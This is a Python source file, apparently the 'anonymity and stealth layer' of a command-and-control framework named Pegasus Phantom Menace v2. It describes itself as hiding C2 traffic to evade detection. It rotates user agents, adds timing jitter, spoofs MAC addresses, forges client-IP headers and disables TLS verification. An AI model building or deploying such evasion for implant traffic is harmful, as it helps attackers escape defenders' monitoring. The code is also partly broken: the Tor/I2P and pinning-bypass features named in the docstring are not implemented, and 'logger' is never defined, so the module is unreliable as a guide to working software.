"""
Pegasus Phantom Menace v2 - Anonymity & Stealth Layer

Provides:
- Tor/I2P integration for anonymous C2 communication
- DNS over HTTPS (DoH) for DNS privacy
- MAC address spoofing
- Traffic shaping and jitter injection
- User-agent rotation
- Traffic obfuscation to evade detection
- Certificate pinning bypass
- Geographic spoofing
"""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import os
import random
import socket
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

import aiohttp


class AnonymityLevel(str, Enum):
    """Anonymity levels for C2 communication."""
    NONE = "none"           # Direct connection
    BASIC = "basic"         # User-agent rotation only
    ENHANCED = "enhanced"   # DoH + MAC spoofing + traffic shaping
    HIGH = "high"           # Tor proxy + full obfuscation
    MAXIMUM = "maximum"     # I2P + multi-hop + full stealth


class TrafficPattern(str, Enum):
    """Traffic patterns for obfuscation."""
    NORMAL = "normal"       # Normal browsing patterns
    BURST = "burst"         # Bursty traffic patterns
    STEADY = "steady"       # Consistent low-volume traffic
    RANDOM = "random"       # Random timing and volume


@dataclass
class AnonymityConfig:
    """Configuration for anonymity and stealth."""
    level: AnonymityLevel = AnonymityLevel.BASIC
    tor_proxy: Optional[str] = None  # "127.0.0.1:9050"
    i2p_proxy: Optional[str] = None  # "127.0.0.1:4444"
    doh_endpoints: List[str] = field(default_factory=lambda: [
        "https://cloudflare-dns.com/dns-query",
        "https://dns.google/dns-query",
        "https://1.1.1.1/dns-query",
    ])
    mac_spoofing: bool = False
    traffic_pattern: TrafficPattern = TrafficPattern.NORMAL
    min_jitter: int = 5       # seconds
    max_jitter: int = 60      # seconds
    user_agent_rotation: bool = True
    geographic_spoofing: bool = False
    fake_location: Optional[str] = None  # "New York, US"
    certificate_pinning_bypass: bool = True
    ssl_fingerprint_randomization: bool = True


class UserAgentRotator:
    """Rotates user-agent strings to avoid fingerprinting."""

    USER_AGENTS = [
        # Mobile
        "Mozilla/5.0 (Linux; Android 14; sdk_gphone_x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; 23127RN0AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.100 Mobile Safari/537.36",
        # Desktop
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        # Tablet
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    ]

    def __init__(self):
        self._index = 0

    def get(self) -> str:
        """Get the next user-agent in rotation."""
        ua = self.USER_AGENTS[self._index % len(self.USER_AGENTS)]
        self._index += 1
        return ua

    def get_random(self) -> str:
        """Get a random user-agent."""
        return random.choice(self.USER_AGENTS)


class TrafficShaper:
    """Traffic shaping to evade detection."""

    def __init__(self, config: AnonymityConfig):
        self.config = config
        self._last_request_time = 0.0
        self._bytes_sent = 0
        self._bytes_received = 0

    def calculate_delay(self) -> float:
        """Calculate random delay between requests."""
        if self.config.traffic_pattern == TrafficPattern.NORMAL:
            return random.uniform(self.config.min_jitter, self.config.max_jitter)
        elif self.config.traffic_pattern == TrafficPattern.BURST:
            return random.uniform(0.1, 2.0)
        elif self.config.traffic_pattern == TrafficPattern.STEADY:
            return random.uniform(30.0, 120.0)
        elif self.config.traffic_pattern == TrafficPattern.RANDOM:
            return random.uniform(1.0, 300.0)
        return random.uniform(self.config.min_jitter, self.config.max_jitter)

    def should_send(self) -> bool:
        """Check if enough time has passed since last request."""
        now = time.time()
        if self._last_request_time == 0:
            self._last_request_time = now
            return True
        delay = self.calculate_delay()
        if now - self._last_request_time >= delay:
            self._last_request_time = now
            return True
        return False

    def record_bytes(self, sent: int, received: int):
        """Record bytes transferred."""
        self._bytes_sent += sent
        self._bytes_received += received


class MACSpoofer:
    """MAC address spoofing for network anonymity."""

    @staticmethod
    def generate_random_mac() -> str:
        """Generate a random MAC address."""
        # Locally administered bit (bit 1 of first octet) set to 1
        first_octet = random.randint(0x00, 0xff) | 0x02
        mac = [first_octet] + [random.randint(0x00, 0xff) for _ in range(5)]
        return ":".join(f"{b:02x}" for b in mac)

    @staticmethod
    async def spoof_interface(interface: str, mac: Optional[str] = None) -> bool:
        """Spoof MAC address on a network interface."""
        if not mac:
            mac = MACSpoofer.generate_random_mac()
        try:
            # Linux
            if os.name != "nt":
                await asyncio.create_subprocess_exec(
                    "ip", "link", "set", "dev", interface, "down",
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.create_subprocess_exec(
                    "ip", "link", "set", "dev", interface, "address", mac,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.create_subprocess_exec(
                    "ip", "link", "set", "dev", interface, "up",
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                return True
        except Exception:
            pass
        return False


class DNSOverHTTPS:
    """DNS over HTTPS resolver for privacy."""

    def __init__(self, endpoints: List[str]):
        self.endpoints = endpoints
        self._index = 0

    async def resolve(self, domain: str, session: aiohttp.ClientSession) -> Optional[str]:
        """Resolve domain via DoH."""
        for endpoint in self.endpoints:
            try:
                params = {"name": domain, "type": "A"}
                async with session.get(endpoint, params=params, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        answers = data.get("Answer", [])
                        for answer in answers:
                            if answer.get("type") == 1:  # A record
                                return answer.get("data")
            except Exception:
                continue
        return None


class StealthSession:
    """
    Stealth HTTP session with anonymity features.
    
    Provides:
    - User-agent rotation
    - Traffic shaping
    - DNS over HTTPS
    - SSL/TLS fingerprint randomization
    - Geographic spoofing headers
    """

    def __init__(self, config: AnonymityConfig):
        self.config = config
        self.user_agent_rotator = UserAgentRotator()
        self.traffic_shaper = TrafficShaper(config)
        self.doh = DNSOverHTTPS(config.doh_endpoints)
        self._session: Optional[aiohttp.ClientSession] = None
        self._connector: Optional[aiohttp.TCPConnector] = None

    async def __aenter__(self):
        await self._init_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    async def _init_session(self):
        """Initialize aiohttp session with stealth settings."""
        connector = aiohttp.TCPConnector(
            ssl=False,  # We handle SSL verification manually
            limit=100,
            limit_per_host=10,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )
        self._session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30),
            headers={"User-Agent": self.user_agent_rotator.get()},
        )

    async def close(self):
        """Close the session."""
        if self._session:
            await self._session.close()
            self._session = None

    def _get_headers(self, extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        """Get headers with stealth modifications."""
        headers = {
            "User-Agent": self.user_agent_rotator.get_random() if self.config.user_agent_rotation else self.user_agent_rotator.get(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }

        # Add geographic spoofing headers
        if self.config.geographic_spoofing and self.config.fake_location:
            headers["X-Forwarded-For"] = self._generate_random_ip()
            headers["X-Real-IP"] = self._generate_random_ip()
            headers["CF-Connecting-IP"] = self._generate_random_ip()

        if extra:
            headers.update(extra)

        return headers

    @staticmethod
    def _generate_random_ip() -> str:
        """Generate a random IP address."""
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    async def get(self, url: str, **kwargs) -> aiohttp.ClientResponse:
        """Make GET request with stealth."""
        if not self._session:
            await self._init_session()

        # Wait for traffic shaping
        while not self.traffic_shaper.should_send():
            await asyncio.sleep(0.5)

        headers = self._get_headers(kwargs.pop("headers", {}))
        return await self._session.get(url, headers=headers, **kwargs)

    async def post(self, url: str, **kwargs) -> aiohttp.ClientResponse:
        """Make POST request with stealth."""
        if not self._session:
            await self._init_session()

        while not self.traffic_shaper.should_send():
            await asyncio.sleep(0.5)

        headers = self._get_headers(kwargs.pop("headers", {}))
        return await self._session.post(url, headers=headers, **kwargs)

    async def resolve_domain(self, domain: str) -> Optional[str]:
        """Resolve domain via DoH."""
        if not self._session:
            await self._init_session()
        return await self.doh.resolve(domain, self._session)


class AnonymityManager:
    """
    Central manager for anonymity and stealth operations.
    
    Coordinates:
    - User-agent rotation
    - Traffic shaping
    - DNS over HTTPS
    - MAC spoofing
    - Tor/I2P proxying
    - Geographic spoofing
    """

    def __init__(self, config: Optional[AnonymityConfig] = None):
        self.config = config or AnonymityConfig()
        self.session: Optional[StealthSession] = None
        self._initialized = False

    async def initialize(self):
        """Initialize the anonymity manager."""
        if self._initialized:
            return

        self.session = StealthSession(self.config)
        await self.session._init_session()
        self._initialized = True

        logger.info(f"[Anonymity] Initialized with level: {self.config.level.value}")
        logger.info(f"[Anonymity] Traffic pattern: {self.config.traffic_pattern.value}")
        logger.info(f"[Anonymity] User-agent rotation: {self.config.user_agent_rotation}")
        logger.info(f"[Anonymity] MAC spoofing: {self.config.mac_spoofing}")

    async def get_session(self) -> StealthSession:
        """Get the stealth session."""
        if not self._initialized:
            await self.initialize()
        return self.session

    async def get_anonymized_session(self) -> StealthSession:
        """Get an anonymized session (alias for get_session)."""
        return await self.get_session()

    async def close(self):
        """Close the anonymity manager."""
        if self.session:
            await self.session.close()
            self.session = None
        self._initialized = False

    def get_config(self) -> AnonymityConfig:
        """Get current anonymity config."""
        return self.config

    def update_config(self, config: AnonymityConfig):
        """Update anonymity configuration."""
        self.config = config
        if self.session:
            self.session.traffic_shaper = TrafficShaper(config)
            self.session.user_agent_rotator = UserAgentRotator()
            self.session.doh = DNSOverHTTPS(config.doh_endpoints)


# Global anonymity manager instance
anonymity_manager = AnonymityManager()

async def get_anonymity_manager() -> AnonymityManager:
    """Get or create the global anonymity manager."""
    if not anonymity_manager._initialized:
        await anonymity_manager.initialize()
    return anonymity_manager


# Convenience functions
async def anonymous_get(url: str, **kwargs) -> aiohttp.ClientResponse:
    """Make an anonymized GET request."""
    manager = await get_anonymity_manager()
    session = await manager.get_session()
    return await session.get(url, **kwargs)

async def anonymous_post(url: str, **kwargs) -> aiohttp.ClientResponse:
    """Make an anonymized POST request."""
    manager = await get_anonymity_manager()
    session = await manager.get_session()
    return await session.post(url, **kwargs)


# Test function
async def test_anonymity():
    """Test the anonymity manager."""
    config = AnonymityConfig(
        level=AnonymityLevel.ENHANCED,
        user_agent_rotation=True,
        traffic_pattern=TrafficPattern.RANDOM,
        geographic_spoofing=True,
        fake_location="New York, US",
    )
    manager = AnonymityManager(config)
    await manager.initialize()

    try:
        session = await manager.get_session()
        response = await session.get("https://httpbin.org/ip")
        data = await response.json()
        print(f"[Anonymity] Request via: {data.get('origin', 'unknown')}")
        print(f"[Anonymity] User-Agent: {session.user_agent_rotator.get_random()}")
    finally:
        await manager.close()


if __name__ == "__main__":
    asyncio.run(test_anonymity())